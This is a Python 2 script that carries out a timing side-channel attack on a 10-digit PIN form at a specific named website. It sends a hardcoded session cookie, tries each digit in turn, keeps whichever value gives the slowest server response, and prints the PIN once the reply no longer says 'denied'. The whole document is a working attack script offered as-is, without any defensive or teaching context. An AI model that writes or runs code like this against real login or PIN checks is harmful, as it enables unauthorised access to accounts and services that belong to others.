#!/usr/bin/env python

 

import urllib2, sys, multiprocessing, Queue
from datetime import datetime
from threading import Thread

def pin_tester(i,j,qp,qtime, qmax, url, headers, data_format,p,time, max):

    p2 = p
    t2 = time
    m2 = max
    #p2 = [0,0,0,0,0,0,0,0,0,0]
	
    p2[i] = j
    data = data_format.format(p2[0],p2[1],p2[2],p2[3],p2[4],p2[5],p2[6],p2[7],p2[8],p2[9]) 

    req = urllib2.Request(url, data, headers)

    start = datetime.now()

    res = urllib2.urlopen(req)

    end = datetime.now()
	
    message = res.read()
	
    diff = end - start

    if 'denied' not in message:

        print 'Pin {},{},{},{},{},{},{},{},{},{}'.format(p2[0],p2[1],p2[2],p2[3],p2[4],p2[5],p2[6],p2[7],p2[8],p2[9])

        pend = datetime.now()
        pdiff = pend - pstart

        print pdiff
        print 'Accepted'

        sys.exit(0)

    else:

        if diff > t2[i] and j != 0:
            t2[i] = diff
            m2[i] = j

	    pend = datetime.now()
	    print p2
	    print diff

    qp[i].put(m2[i])
    qtime[i].put(t2[i])
    qmax[i].put(m2[i])

	    

if __name__ == '__main__':

    pstart = datetime.now()
    tz = datetime.now() - datetime.now()

    url = 'https://www.tagleader.com/pin.php'

    headers = {'Cookie':'PHPSESSID=07390o7m74oj7olnqlt64mm0h2'}

    data_format = 'pin1={}&pin2={}&pin3={}&pin4={}&pin5={}&pin6={}&pin7={}&pin8={}&pin9={}&pin10={}&submit='

    qp = [Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue()]
    p = [0,0,0,0,0,0,0,0,0,0] 
    qtime = [Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue()]
    time = [tz,tz,tz,tz,tz,tz,tz,tz,tz,tz]
    qmax = [Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue(),Queue.Queue()]
    max = [0,0,0,0,0,0,0,0,0,0]

    for i in range(10):

	for j in range(10):
 
            Thread(target=pin_tester, args=(i,j,qp, qtime,qmax,url,headers,data_format,p,time, max)).start()
            p[i] = qp[i].get()
	    time[i] = qtime[i].get()
            max[i] = qmax[i].get()

	    print p
	    #pend  = datetime.now()
	    #runtime = pend - pstart
	    print datetime.now() - pstart
